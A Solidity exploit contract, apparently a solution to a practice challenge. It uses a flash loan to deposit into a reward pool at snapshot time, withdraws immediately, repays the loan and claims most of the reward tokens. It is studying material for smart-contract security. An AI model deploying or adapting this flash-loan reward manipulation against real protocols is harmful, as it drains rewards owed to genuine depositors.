// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashLoanerPool {
  function flashLoan(uint256 amount) external;
}

interface IRewarderPool {
  function rewardToken() external returns (address);
  function liquidityToken() external returns (address);
  function deposit(uint256 amountToDeposit) external;
  function withdraw(uint256 amountToWithdraw) external;
  function distributeRewards() external returns (uint256);
}

/**
@title The Rewarder Attack Contract
@author broccolirob
@notice Deposit function on the pool triggers a snapshot with current supply and 
who owns them. This contract can deposit, trigger snapshot, and immediately 
withdraw, then in 5 days it'll show that this account had that big deposit and 
distribute most of the reward tokens to it.
 */
contract TheRewarderAttack {
  address private owner;
  IRewarderPool private rewardPool;
  IFlashLoanerPool private loanProvider;
  IERC20 private dvt;
  IERC20 private rToken;
  constructor(IRewarderPool rPool, IFlashLoanerPool flashLoaner) {
    owner = msg.sender;
    rewardPool = rPool;
    loanProvider = flashLoaner;
    dvt = IERC20(rewardPool.liquidityToken());
    rToken = IERC20(rewardPool.rewardToken());
  }

  function receiveFlashLoan(uint256 amount) external {
    require(msg.sender == address(loanProvider), "Only loan provider");
    // approve rewarder pool to spend DVT tokens.
    dvt.approve(address(rewardPool), amount);
    // deposit DVT tokens in rewarder pool.
    rewardPool.deposit(amount);
    // withdraw DVT tokens from rewarder pool.
    rewardPool.withdraw(amount);
    // send DVT tokens back to flash loan provider.
    dvt.transfer(address(loanProvider), amount);
  }

  function attack() external {
    require(msg.sender == owner, "Only owner");
    uint256 available = dvt.balanceOf(address(loanProvider));
    loanProvider.flashLoan(available);
    uint256 balance = rToken.balanceOf(address(this));
    require(balance > 0, "No rewards given");
    require(rToken.transfer(msg.sender, balance), "Transfer failed");
  }
}